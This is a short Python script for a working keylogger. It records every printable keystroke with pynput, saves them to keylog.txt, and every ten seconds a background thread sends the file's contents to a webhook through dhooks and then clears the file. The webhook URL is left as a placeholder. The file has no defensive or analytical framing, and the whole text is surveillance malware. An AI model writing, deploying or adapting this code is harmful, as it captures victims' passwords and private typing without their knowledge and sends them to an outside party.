from pynput import keyboard
from dhooks import Webhook
import threading
import time
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return
    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)
def llistener():
    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
#send content of file function
hook = Webhook (" web hook here")
def send():
    while True:
        with open("keylog.txt", "r") as file:
            content = file.read()
        if not content.strip():
            continue
        # data = "hello world test!"
        hook.send(content)
        with open("keylog.txt", "r+") as con:
            con.seek(0)
            con.truncate()
        time.sleep(10)
thread1 = threading.Thread(target=llistener, daemon=True)
thread2 = threading.Thread(target=send, daemon=True)
    # Start the threads
thread1.start()
thread2.start()
while True:
     pass
